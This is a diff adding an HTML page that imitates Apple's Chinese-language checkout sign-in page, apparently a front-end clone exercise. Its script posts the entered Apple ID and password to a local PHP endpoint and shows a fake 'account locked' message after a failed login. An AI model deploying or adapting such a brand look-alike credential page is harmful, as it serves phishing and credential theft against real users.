@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>登录 — 安全结账 - Apple (中国大陆)</title>
+    <script src="../js/promiseAjax.js"></script>
+    <link href="../css/bootstrap.css">
+    <script src="../js/jquery.js"></script>
+    <style type="text/css">
+        * {
+            margin: 0;
+            padding: 0;
+        }
+
+        a {
+            text-decoration: none;
+            color: blue;
+        }
+
+        i {
+            font-style: none;
+        }
+
+        .login {
+            height: 140px;
+        }
+
+        .login-main {
+            width: 918px;
+            height: 140px;
+            ;
+            margin: 0 auto;
+            margin-top: 8px;
+            line-height: 140px;
+        }
+
+        .head {
+            height: 297px;
+        }
+
+        .head-main {
+            width: 918px;
+            height: 297px;
+            margin: 0 auto;
+        }
+
+        .ptn1 {
+            margin-bottom: 14px;
+        }
+
+        ;
+        .ptn2 {
+            margin-bottom: 14px;
+
+        }
+
+        .article {
+            width: 380px;
+            font-size: 12px;
+            color: #333333;
+            line-height: 18px;
+            margin-top: 14px;
+            margin-bottom: 27px;
+        }
+
+        ;
+        .banber {
+            height: 152px;
+        }
+
+        .banner-main {
+            width: 918px;
+            height: 152px;
+            margin: 0 auto;
+            border-bottom: 1px solid #d6d6d6;
+        }
+
+        .banner-main .a1 {
+            padding-top: 11px;
+            line-height: 29px;
+            
+        }
+        .banner-main .a2 {
+            line-height: 29px;
+            padding-bottom: 83px;
+            
+        }
+
+        .foot {
+            height: 62px;
+        }
+
+        .foot-main {
+            width: 918px;
+            height: 62px;
+            margin: 0 auto;
+            line-height: 62px;
+            font-size: 14px;
+        }
+
+        .all {
+            background: #f2f2f2
+        }
+
+        .down {
+            height: 46px;
+        }
+
+        .down-main {
+            width: 918px;
+            height: 46px;
+            margin: 0 auto;
+            color: #888888;
+            font-size: 10px;
+            border-bottom: 1px solid #d6d6d6;
+        }
+
+        .down-top {
+            height: 46px;
+            line-height: 46px;
+            border-bottom: 1px solid #d6d6d6
+        }
+
+        ;
+        .level {
+            height: 80px;
+        }
+
+        .level-main {
+            width: 918px;
+            height: 80px;
+            margin: 0 auto;
+            color: #888888;
+            font-size: 10px;
+        }
+        
+        .level-top {
+            padding-top: 18px;
+            line-height: 20px;
+        }
+        
+        .level-bottom{
+            line-height: 20px;
+        }
+
+        .level-bottom a {
+            display: inline-block;
+            width: 64px;
+
+        }
+        #err{
+            height: 21px;
+        }
+    </style>
+</head>
+
+<body>
+    <!--请登录开始-->
+    <div class="login">
+        <div class="login-main">
+            <h1>请登录。</h1>
+        </div>
+    </div>
+    <!--请登录结束-->
+
+    <!--登录开始-->
+    <div class="head">
+        <div class="head-main">
+            <span id="err"></span>
+            <p>
+                <input type="text" class="ptn1" placeholder="&nbsp;&nbsp;&nbsp;Apple ID" id="username" style="width: 380px;height: 50px;border: 1px solid #d6d6d6;border-radius: 5px;" autocomplete="off">
+            </p>
+            <span id="arr"></span>
+            <p>
+                <input type="password" class="ptn2" placeholder="&nbsp;&nbsp;&nbsp;密码" id="password" style="width: 380px;height: 50px;border: 1px solid #d6d6d6;border-radius: 5px;">
+            </p>
+            <span id="brr"></span>
+            <p class="article">
+                你的 Apple ID 是你用来登录 iTunes、App Store 和 iCloud 的电子邮件地址或手机号码。
+            </p>
+            <p>
+                <button id="btn" style="width: 380px;height: 50px; background:#2088da;border:1px solid #0077cc; border-radius: 5px; color:#fff;">登录</button>
+            </p>
+        </div>
+    </div>
+    <!--登录结束-->
+
+    <!--忘记密码开始-->
+    <div class="banner">
+        <div class="banner-main">
+            <a class="a1" href="#">忘记了 Apple ID 或密码？</a>
+            <br>
+            <a class="a2" href="#">没有 Apple ID？立即创建一个。</a>
+        </div>
+    </div>
+    <!--忘记密码结束-->
+
+    <!--需要帮助开始-->
+    <div class="foot">
+        <div class="foot-main">需要更多帮助？
+            <a href>立即在线交流</a>，或拨打 400-666-8800。</div>
+    </div>
+    <!--需要帮助结束-->
+
+    <!--底部开始-->
+    <div class="all">
+        <div class="down">
+            <div class="down-main">
+                <div class="down-top">Apple Store 在线商店采用符合业界标准的加密技术对您提交的信息进行保密。进一步了解我们的安全政策。</div>
+            </div>
+        </div>
+        <div class="level">
+            <div class="level-main">
+                <div class="level-top">
+                    更多选购方式：前往
+                    <a href="#">Apple Store 零售店</a>，致电 400-666-8800 或查找在你附近的
+                    <a href="#">授权经销商</a>。
+                </div>
+                <div class="level-bottom">
+                    Copyright © 2019 Apple Inc. 保留所有权利。
+                    <a href="#" style="color: #000;">隐私政策</a>
+                    <a href="#" style="color: #000;">使用条款</a>
+                    <a href="#" style="color: #000;">销售政策</a>
+                    <a href="#" style="color: #000;">网站地图</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--底部结束-->
+</body>
+<script>
+    $("#btn").click(function(){
+        var username = $("#username").val();
+        var password = $("#password").val();
+        //当ID为空 密码不为空时 id框显示未填写
+        if($.trim(username) =='' && $.trim(password) !=''){
+            $("#arr").html('Apple ID 未填写').css({'color':'red','font-size':'8px'});
+            $(".ptn1").css({'background-color':'#fef0f0','margin-bottom':'0','border':'1px solid #de071c'});
+
+        }else{
+            //当密码为空 id不为空时 密码框显示未填写
+            if($.trim(username) !='' && $.trim(password) ==''){
+            $("#brr").html('密码 未填写').css({'color':'red','font-size':'8px'});   
+            $(".ptn2").css({'background-color':'#fef0f0','margin-top':'5px','border':'1px solid #de071c'});
+        }else
+            {if($.trim(username) ==''||$.trim(password) ==''){
+
+            $("#arr").html('Apple ID 未填写').css({'color':'red','font-size':'8px'});
+            $("#brr").html('密码 未填写').css({'color':'red','font-size':'8px'});   
+            $(".ptn1").css({'background-color':'#fef0f0','margin-bottom':'0','border':'1px solid #de071c'});
+            $(".ptn2").css({'background-color':'#fef0f0','margin-top':'5px','border':'1px solid #de071c'});
+        };
+        }
+
+        }
+        
+
+        
+        var _this = $(this);
+		_this.prop("disabled",true).html('登录中...')
+		$("#err").html('');
+		$.post("../php/login.php",{"username":username,"password":password},function(res){
+			_this.prop("disabled",false).html('登录');
+            console.log(res)
+            //id与密码正确 提示登录成功
+			if(res.code == 200){
+				alert(res.message);
+			}else{
+                //当ID与密码都不对时(err)提示错误信息
+                if(($.trim(username) !='username' && $.trim(password) !='password') && ($.trim(username) !=''&& $.trim(password) !='')){
+				$("#err").html('出于安全原因，此 Apple ID 已被锁定。请访问 iForgot 以重设您的帐户 (https://iforgot.apple.com)。').css({'color':'red','width':'380px','height':'50px','display':'block','font-size':'14px','background-color':'#fef0f0','color':'#000','line-height':'25px'});
+            }
+        }
+		},'json')
+    });
+ 
+</script>
+</html>
